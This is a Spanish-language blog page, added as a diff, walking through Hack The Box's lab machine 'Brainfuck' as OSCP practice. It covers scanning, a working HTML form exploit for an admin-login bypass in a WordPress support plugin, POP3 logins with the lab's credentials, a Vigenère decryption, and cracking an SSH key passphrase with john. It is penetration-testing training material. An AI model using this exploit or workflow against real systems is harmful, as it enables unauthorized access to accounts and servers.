@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>OSCP Path ~ Brainfuck de Hack The Box (Necesario VIP) | Pirrandi Blog</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="OSCP Path ~ Brainfuck de Hack The Box (Necesario VIP)" />
+<meta name="author" content="Pirrandi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Writeup de la maquina de HackTheBox llamada BRAINFUCK siguiendo el PATH para el OSCP" />
+<meta property="og:description" content="Writeup de la maquina de HackTheBox llamada BRAINFUCK siguiendo el PATH para el OSCP" />
+<link rel="canonical" href="http://localhost:4000/2021/06/10/Brainfuck.html" />
+<meta property="og:url" content="http://localhost:4000/2021/06/10/Brainfuck.html" />
+<meta property="og:site_name" content="Pirrandi Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-10T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="OSCP Path ~ Brainfuck de Hack The Box (Necesario VIP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2021-06-10T00:00:00-03:00","datePublished":"2021-06-10T00:00:00-03:00","description":"Writeup de la maquina de HackTheBox llamada BRAINFUCK siguiendo el PATH para el OSCP","headline":"OSCP Path ~ Brainfuck de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/06/10/Brainfuck.html"},"url":"http://localhost:4000/2021/06/10/Brainfuck.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi Blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pirrandi Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="" class="author-avatar" alt="Avatar" />
+    
+Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">OSCP Path ~ Brainfuck de Hack The Box (Necesario VIP)</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/OSCP/">OSCP</a>
+      
+      <a class="tag" href="/tag/Path,/">Path,</a>
+      
+      <a class="tag" href="/tag/Cifrado/">Cifrado</a>
+      
+      <a class="tag" href="/tag/Decimal,/">Decimal,</a>
+      
+      <a class="tag" href="/tag/Cifrado/">Cifrado</a>
+      
+      <a class="tag" href="/tag/Hex,/">Hex,</a>
+      
+      <a class="tag" href="/tag/Dovecot,/">Dovecot,</a>
+      
+      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
+      
+      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
+      
+      <a class="tag" href="/tag/Writeup,/">Writeup,</a>
+      
+      <a class="tag" href="/tag/Hacking/">Hacking</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 10 Jun 2021</div>
+  
+  <noscript>
+    <div class="post-description">Writeup de la maquina de HackTheBox llamada BRAINFUCK siguiendo el PATH para el OSCP</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="brainfuck--hack-the-box-to-oscp">Brainfuck ~ Hack The Box to OSCP</h1>
+
+<p>Realizamos el Primer escaneo con Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.17       "</span>
+</code></pre></div></div>
+<p>Procedemos con el siguiente escaneo de Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 <span class="o">(</span>ED25519<span class="o">)</span>
+25/tcp  open  smtp     Postfix smtpd
+|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+110/tcp open  pop3     Dovecot pop3d
+|_pop3-capabilities: SASL<span class="o">(</span>PLAIN<span class="o">)</span> UIDL USER TOP RESP-CODES PIPELINING AUTH-RESP-CODE CAPA
+143/tcp open  imap     Dovecot imapd
+|_imap-capabilities: Pre-login more IMAP4rev1 <span class="nv">AUTH</span><span class="o">=</span>PLAINA0001 have post-login listed ID OK LITERAL+ IDLE LOGIN-REFERRALS SASL-IR ENABLE capabilities
+443/tcp open  ssl/http nginx 1.10.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-server-header: nginx/1.10.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Welcome to nginx!
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>brainfuck.htb/organizationName<span class="o">=</span>Brainfuck Ltd./stateOrProvinceName<span class="o">=</span>Attica/countryName<span class="o">=</span>GR
+| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
+| Not valid before: 2017-04-13T11:19:29
+|_Not valid after:  2027-04-11T11:19:29
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+Service Info: Host:  brainfuck<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Vemos que se aplica el concepto de <code class="language-plaintext highlighter-rouge">&lt;Virtual hosting &gt;</code> <code class="language-plaintext highlighter-rouge">brainfuck.htb</code>, <code class="language-plaintext highlighter-rouge">sup3rs3cr3t.brainfuck.htb</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># whatweb https://brainfuck.htb                                                         </span>
+https://brainfuck.htb <span class="o">[</span>200 OK] Bootstrap[4.7.3], Country[RESERVED][ZZ], Email[ajax-loader@2x.gif,orestis@brainfuck.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.17], JQuery[1.12.4], MetaGenerator[WordPress 4.7.3], Modernizr, PoweredBy[WordPress,], Script[text/javascript], Title[Brainfuck Ltd. &amp;#8211<span class="p">;</span> Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3], nginx[1.10.0]  
+</code></pre></div></div>
+<p>Lanzamos un <code class="language-plaintext highlighter-rouge">whatweb</code> y estamos anter un <code class="language-plaintext highlighter-rouge">"Wordpress 4.7.3"</code></p>
+
+<p>Procedemos a lanzar un escaneo con la herramienta <code class="language-plaintext highlighter-rouge">wpscan</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Con <span class="nt">--disable-tls-checks</span> le decimos que no checke eso 
+Con <span class="nt">-e</span> vp<span class="o">(</span>Plugins Vulnerables<span class="o">)</span> , u<span class="o">(</span>usuarios<span class="o">)</span>
+Con <span class="nt">-o</span> &lt;Fichero de Salidad Output&gt;
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># wpscan --url https://brainfuck.htb/ --disable-tls-checks -e vp,u -o vpscan.txt</span>
+                                                                                                                                                                                
+┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/home/…/HTB/OSCP/BrainFuck/nmap]
+└─# <span class="nb">cat </span>vpscan.txt    
+_______________________________________________________________
+         __          _______   _____
+         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
+          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
+           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.14
+                               
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: https://brainfuck.htb/ [10.10.10.17]
+[+] Started: Wed Jun  9 15:29:54 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: nginx/1.10.0 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: https://brainfuck.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] WordPress readme found: https://brainfuck.htb/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: https://brainfuck.htb/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
+ | Found By: Rss Generator (Passive Detection)
+ |  - https://brainfuck.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;
+ |  - https://brainfuck.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.7.3&lt;/generator&gt;
+
+[+] WordPress theme in use: proficient
+ | Location: https://brainfuck.htb/wp-content/themes/proficient/
+ | Last Updated: 2021-05-09T00:00:00.000Z
+ | Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
+ | [!] The version is out of date, the latest version is 3.0.45
+ | Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3
+ | Style Name: Proficient
+ | Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a prof...
+ | Author: Specia
+ | Author URI: https://speciatheme.com/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.0.6 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - https://brainfuck.htb/wp-content/themes/proficient/style.css?ver=4.7.3, Match: '</span>Version: 1.0.6<span class="s1">'
+
+
+[i] No plugins Found.
+
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] administrator
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Wed Jun  9 15:30:02 2021
+[+] Requests Done: 74
+[+] Cached Requests: 6
+[+] Data Sent: 17.288 KB
+[+] Data Received: 16.927 MB
+[+] Memory used: 224.105 MB
+[+] Elapsed time: 00:00:07
+</span></code></pre></div></div>
+
+<p>Fuzzeamos con la herramienta DIRB</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># dirb https://brainfuck.htb           </span>
+
+<span class="nt">-----------------</span>
+START_TIME: Wed Jun  9 15:37:50 2021
+URL_BASE: https://brainfuck.htb/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+<span class="nt">-----------------</span>
+
+GENERATED WORDS: 4612                                                          
+
+<span class="nt">----</span> Scanning URL: https://brainfuck.htb/ <span class="nt">----</span>
++ https://brainfuck.htb/index.php <span class="o">(</span>CODE:301|SIZE:0<span class="o">)</span>                                                                                                                            
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-admin/                                                                                                                                 
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-content/                                                                                                                               
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-includes/                                                                                                                              
++ https://brainfuck.htb/xmlrpc.php <span class="o">(</span>CODE:405|SIZE:42<span class="o">)</span>                                                                                                                          
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-admin/ <span class="nt">----</span>
++ https://brainfuck.htb/wp-admin/admin.php <span class="o">(</span>CODE:302|SIZE:0<span class="o">)</span>                                                                                                                   
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-admin/css/                                                                                                                             
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-admin/images/                                                                                                                          
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-admin/includes/                                                                                                                        
++ https://brainfuck.htb/wp-admin/index.php <span class="o">(</span>CODE:302|SIZE:0<span class="o">)</span>                                                                                                                   
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-admin/js/                                                                                                                              
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-admin/maint/                                                                                                                           
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-admin/network/                                                                                                                         
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-admin/user/                                                                                                                            
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-content/ <span class="nt">----</span>
++ https://brainfuck.htb/wp-content/index.php <span class="o">(</span>CODE:200|SIZE:0<span class="o">)</span>                                                                                                                 
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-content/plugins/                                                                                                                       
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-content/themes/                                                                                                                        
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-content/upgrade/                                                                                                                       
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-content/uploads/                                                                                                                       
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-includes/ <span class="nt">----</span>
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-includes/certificates/                                                                                                                 
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-includes/css/                                                                                                                          
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-includes/customize/                                                                                                                    
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-includes/fonts/                                                                                                                        
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-includes/images/                                                                                                                       
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-includes/js/                                                                                                                           
+<span class="o">==&gt;</span> DIRECTORY: https://brainfuck.htb/wp-includes/widgets/                                                                                                                      
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-admin/css/ <span class="nt">----</span>
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-admin/images/ <span class="nt">----</span>
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-admin/includes/ <span class="nt">----</span>
++ https://brainfuck.htb/wp-admin/includes/admin.php <span class="o">(</span>CODE:500|SIZE:0<span class="o">)</span>                                                                                                          
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-admin/js/ <span class="nt">----</span>
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-admin/maint/ <span class="nt">----</span>
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-admin/network/ <span class="nt">----</span>
++ https://brainfuck.htb/wp-admin/network/admin.php <span class="o">(</span>CODE:302|SIZE:0<span class="o">)</span>                                                                                                           
++ https://brainfuck.htb/wp-admin/network/index.php <span class="o">(</span>CODE:302|SIZE:0<span class="o">)</span>                                                                                                           
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-admin/user/ <span class="nt">----</span>
++ https://brainfuck.htb/wp-admin/user/admin.php <span class="o">(</span>CODE:302|SIZE:0<span class="o">)</span>                                                                                                              
++ https://brainfuck.htb/wp-admin/user/index.php <span class="o">(</span>CODE:302|SIZE:0<span class="o">)</span>                                                                                                              
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-content/plugins/ <span class="nt">----</span>
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-content/themes/ <span class="nt">----</span>
++ https://brainfuck.htb/wp-content/themes/index.php <span class="o">(</span>CODE:200|SIZE:0<span class="o">)</span>                                                                                                          
+                                                                                                                                                                               
+<span class="nt">----</span> Entering directory: https://brainfuck.htb/wp-content/upgrade/ <span class="nt">----</span>
+.....ctrl+c
+</code></pre></div></div>
+<p>Vemos que nos sacaba un wp-content/plugins/ pero sin mas resultados
+Probamos a apuntar a la ruta esta <code class="language-plaintext highlighter-rouge">https://brainfuck.htb/wp-content/plugins/</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>../
+akismet/                                           06-Mar-2017 16:00                   -
+easy-wp-smtp/                                      17-Apr-2017 17:17                   -
+wp-support-plus-responsive-ticket-system/          17-Apr-2017 17:51                   -
+hello.php                                          22-May-2013 21:08                2255
+index.php.old 
+</code></pre></div></div>
+<p>Encontramos estos recursos .. vamos a investigar por los plugins en <code class="language-plaintext highlighter-rouge">Searchsploit</code></p>
+
+<p>Obtenemos un Readme.txt <code class="language-plaintext highlighter-rouge">https://brainfuck.htb/wp-content/plugins/easy-wp-smtp/readme.txt</code></p>
+
+<p>Chequeamos por <code class="language-plaintext highlighter-rouge">https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>../
+asset/                                             17-Apr-2017 17:51                   -
+includes/                                          17-Apr-2017 17:51                   -
+lang/                                              17-Apr-2017 17:51                   -
+pipe/                                              17-Apr-2017 17:51                   -
+readme.txt                                         17-Apr-2017 17:51               19938
+wp-support-plus.php 
+</code></pre></div></div>
+<p>Atraves del archivo <code class="language-plaintext highlighter-rouge">readme.txt</code> vemos la version de plugin <code class="language-plaintext highlighter-rouge">V 7.1.3</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># searchsploit wp support</span>
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                                                                |  Path
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+WordPress Plugin WP Live Chat Support 6.2.03 - Persistent Cross-Site Scripting                                                                | php/webapps/40190.txt
+WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                                                      | php/webapps/34589.txt
+WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                                                        | php/webapps/41006.txt
+WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                                                               | php/webapps/40939.txt
+<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+</code></pre></div></div>
+<p>Ahi vemos que tiene una escalada de privilegios para la <code class="language-plaintext highlighter-rouge">version 7.1.3 - Privilege Escalation</code> que resulta interesante</p>
+
+<h1 id="acceso-al-wordpress-como-admin-mediante-el-exploit-encontrado">Acceso al Wordpress como Admin mediante el exploit encontrado</h1>
+
+<p>Exploit encontrado en <code class="language-plaintext highlighter-rouge">SEARCHSPLOIT</code> wp support privlige escalation
+Seteamos la <code class="language-plaintext highlighter-rouge">url</code> , el nombre del <code class="language-plaintext highlighter-rouge">user</code>, y un <code class="language-plaintext highlighter-rouge">correo</code></p>
+
+<p>Lo corremos con <code class="language-plaintext highlighter-rouge">$ firefox  /HTB/OSCP/BrainFuck/exploits/exploit.html</code> y nos logueamos.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /HTB/OSCP/BrainFuck/exploits/exploit.html 
+&lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">"post"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"https://brainfuck.htb/wp-admin/admin-ajax.php"</span><span class="o">&gt;</span>
+        Username: &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"admin"</span><span class="o">&gt;</span>
+        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"email"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"orestis@brainfuck.htb"</span><span class="o">&gt;</span>
+        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"hidden"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"action"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"loginGuestFacebook"</span><span class="o">&gt;</span>
+        &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Login"</span><span class="o">&gt;</span>
+&lt;/form&gt;
+</code></pre></div></div>
+<p>Conseguimos acceso como Admin al panel de Wordpress.
+Entramos como el user admin al CMS wordpress</p>
+
+<p>conseguimos sacar las credenciales para el servicio smntp asique procedemos por ahi</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># telnet 10.10.10.17 110</span>
+Trying 10.10.10.17...
+Connected to 10.10.10.17.
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
++OK Dovecot ready.
+<span class="nt">-ERR</span> Unknown command.
+USER orestis
++OK
+PASS kHGuERB29DNiNE
++OK Logged <span class="k">in</span><span class="nb">.</span>
+list
++OK 2 messages:
+1 977
+2 514
+<span class="c">#Sacamos el primer mail encontrado con el comando RETR 1</span>
+retr 1
++OK 977 octets
+Return-Path: &lt;www-data@brainfuck.htb&gt;
+X-Original-To: orestis@brainfuck.htb
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck <span class="o">(</span>Postfix, from userid 33<span class="o">)</span>
+        <span class="nb">id </span>7150023B32<span class="p">;</span> Mon, 17 Apr 2017 20:15:40 +0300 <span class="o">(</span>EEST<span class="o">)</span>
+To: orestis@brainfuck.htb
+Subject: New WordPress Site
+X-PHP-Originating-Script: 33:class-phpmailer.php
+Date: Mon, 17 Apr 2017 17:15:40 +0000
+From: WordPress &lt;wordpress@brainfuck.htb&gt;
+Message-ID: &lt;00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb&gt;
+X-Mailer: PHPMailer 5.2.22 <span class="o">(</span>https://github.com/PHPMailer/PHPMailer<span class="o">)</span>
+MIME-Version: 1.0
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+
+Your new WordPress site has been successfully <span class="nb">set </span>up at:
+
+https://brainfuck.htb
+
+You can log <span class="k">in </span>to the administrator account with the following information:
+
+Username: admin
+Password: The password you chose during the install.
+Log <span class="k">in </span>here: https://brainfuck.htb/wp-login.php
+
+We hope you enjoy your new site. Thanks!
+
+<span class="nt">--The</span> WordPress Team
+https://wordpress.org/
+<span class="nb">.</span>
+<span class="nb">exit</span>
+<span class="nt">-ERR</span> Unknown <span class="nb">command</span>: EXIT
+<span class="c"># Sacamos el segundo mail con el comando RETR 2</span>
+retr 2
++OK 514 octets
+Return-Path: &lt;root@brainfuck.htb&gt;
+X-Original-To: orestis
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck <span class="o">(</span>Postfix, from userid 0<span class="o">)</span>
+        <span class="nb">id </span>4227420AEB<span class="p">;</span> Sat, 29 Apr 2017 13:12:06 +0300 <span class="o">(</span>EEST<span class="o">)</span>
+To: orestis@brainfuck.htb
+Subject: Forum Access Details
+Message-Id: &lt;20170429101206.4227420AEB@brainfuck&gt;
+Date: Sat, 29 Apr 2017 13:12:06 +0300 <span class="o">(</span>EEST<span class="o">)</span>
+From: root@brainfuck.htb <span class="o">(</span>root<span class="o">)</span>
+
+Hi there, your credentials <span class="k">for </span>our <span class="s2">"secret"</span> forum are below :<span class="o">)</span>
+
+username: orestis
+password: kIEnnfEKJ#9UmdO
+
+Regards
+<span class="nb">.</span>
+</code></pre></div></div>
+<p>Conseguimos entrar al foro supersecreto <code class="language-plaintext highlighter-rouge">https://sup3rs3cr3t.brainfuck.htb/d/1-development</code>
+con las credenciales obtenidas en el servicio de correo 
+Entramos al foro:
+<code class="language-plaintext highlighter-rouge">https://sup3rs3cr3t.brainfuck.htb/d/3-key</code></p>
+
+<p>Encontramos una discussion abierta, y vemos que se esta aplicando un cifrado que parece ser <code class="language-plaintext highlighter-rouge">VIGENERE</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Encontramos Patrones que parecen repetirse, justo la vuln de Vigenere</span>
+Orestis - Hacking <span class="k">for </span>fun and profit
+
+Pieagnm - Jkoijeg nbw zwx mle grwsnn
+</code></pre></div></div>
+<p>Codigo Vigenere : Vuln hay que buscar patrones repetitivos o que sean parecidos para sacar la clave(abajo)
+http://rumkin.com/tools/cipher/vigenere.php</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Brain fuCkmybrain fuckmybrain fu
+</code></pre></div></div>
+<p>Con la contraseña <code class="language-plaintext highlighter-rouge">fuckmybrain</code> conseguimos ir sacando los mensajes
+hasta encontrar este relevante:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>There you go you stupid fuck, I hope you remember your  key password because I dont  https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+</code></pre></div></div>
+<p>Obtenemos un fichero id_rsa pero esta cifrado .. Asique vamos a tener que usar la herramienta <code class="language-plaintext highlighter-rouge">ssh2john.py</code> que es para pasar el Hash a un formato en el que <code class="language-plaintext highlighter-rouge">john</code> pueda entender para hacer fueza bruta.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># locate 2john | grep ssh</span>
+/usr/share/john/ssh2john.py
+<span class="c">#Paso 1 </span>
+<span class="o">(</span>root💀kali<span class="o">)</span>-[/home/…/HTB/OSCP/BrainFuck/content]
+└─# /usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> <span class="s2">"hash_rsa"</span>
+<span class="c"># Paso 2                                                                                                                                                                                </span>
+┌──<span class="o">(</span>root💀kali<span class="o">)</span>-[/home/…/HTB/OSCP/BrainFuck/content]
+└─# john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="s2">"hash_rsa"</span>            
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Will run 8 OpenMP threads
+Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
+finding a possible candidate.
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+<span class="s2">"3poulakia!  "</span>       <span class="o">(</span>id_rsa<span class="o">)</span>
+Warning: Only 5 candidates left, minimum 8 needed <span class="k">for </span>performance.
+1g 0:00:00:02 DONE <span class="o">(</span>2021-06-09 18:18<span class="o">)</span> 0.4201g/s 6025Kp/s 6025Kc/s 6025KC/s <span class="k">*</span>7¡Vamos!..rootpassword!
+Session completed
